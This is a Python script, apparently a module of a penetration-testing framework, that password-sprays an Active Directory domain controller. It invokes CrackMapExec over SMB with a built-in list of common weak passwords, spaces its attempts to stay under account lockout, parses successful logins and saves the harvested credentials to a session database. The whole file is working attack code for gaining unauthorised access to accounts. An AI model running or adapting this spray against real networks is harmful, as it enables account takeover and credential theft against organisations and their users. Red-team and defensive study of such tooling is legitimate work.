#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess
import time
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

# Common weak passwords for AD environments
DEFAULT_PASSWORDS = [
    "Password1",
    "Password123",
    "Welcome1",
    "Winter2024",
    "Summer2024",
    "CompanyName1",
    "Changeme123"
]

def parse_cme_output(output, domain):
    """Parse CrackMapExec output for successful authentications."""
    valid_creds = []
    for line in output.split('\n'):
        if '[+]' in line and '\\' in line:
            # Example: SMB  192.168.1.10  445  DC01  [+] DOMAIN\user:Password1
            try:
                parts = line.split('[+]')[1].strip().split()
                cred_part = parts[1] if len(parts) > 1 else parts[0]
                
                if '\\' in cred_part:
                    domain_user, password = cred_part.split(':')
                    username = domain_user.split('\\')[1]
                    valid_creds.append({
                        'username': username,
                        'password': password,
                        'domain': domain
                    })
            except Exception as e:
                logger.debug(f"Could not parse line: {line} - {e}")
    
    return valid_creds

def run_spray(session_dir, domain, dc_ip, username_file=None, password_list=None):
    global logger
    setup_logger("password_spray", session_dir)
    logger = get_logger("password_spray")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting Password Spray against {domain} ({dc_ip})")
    
    # Get usernames from DB if not provided
    if not username_file:
        session = db.get_session()
        creds = session.query(Credential).filter_by(domain=domain).all()
        usernames = [c.username for c in creds if c.username]
        session.close()
        
        if not usernames:
            logger.warning("No usernames enumerated yet. Skipping spray.")
            return
        
        # Write to temp file
        username_file = os.path.join(session_dir, "users.txt")
        with open(username_file, 'w') as f:
            f.write('\n'.join(usernames))
        logger.info(f"Using {len(usernames)} usernames from database")
    
    # Use default passwords if not provided
    passwords = password_list if password_list else DEFAULT_PASSWORDS
    
    logger.info(f"Testing {len(passwords)} passwords against {len(usernames) if isinstance(usernames, list) else 'unknown'} users")
    
    success_count = 0
    
    for password in passwords:
        logger.info(f"Trying password: {password}")
        
        # CrackMapExec command
        cmd = [
            "crackmapexec", "smb", dc_ip,
            "-u", username_file,
            "-p", password,
            "--continue-on-success"
        ]
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # Parse output
            valid = parse_cme_output(result.stdout, domain)
            
            for cred in valid:
                logger.info(f"[SUCCESS] {cred['username']}:{cred['password']}")
                db.add_credential(
                    username=cred['username'],
                    domain=cred['domain'],
                    password=cred['password'],
                    source="password_spray"
                )
                success_count += 1
            
        except subprocess.TimeoutExpired:
            logger.error("CrackMapExec timed out")
        except FileNotFoundError:
            logger.error("CrackMapExec not found. Install with: apt install crackmapexec")
            return
        except Exception as e:
            logger.error(f"Error running spray: {e}")
        
        # Sleep between passwords to avoid lockout
        logger.debug("Sleeping 30s between attempts...")
        time.sleep(30)
    
    logger.info(f"Password spray complete. Found {success_count} valid credentials.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--username-file", help="File with usernames (optional)")
    parser.add_argument("--passwords", nargs="+", help="Custom password list")
    args = parser.parse_args()
    
    run_spray(args.session_dir, args.domain, args.dc_ip, args.username_file, args.passwords)
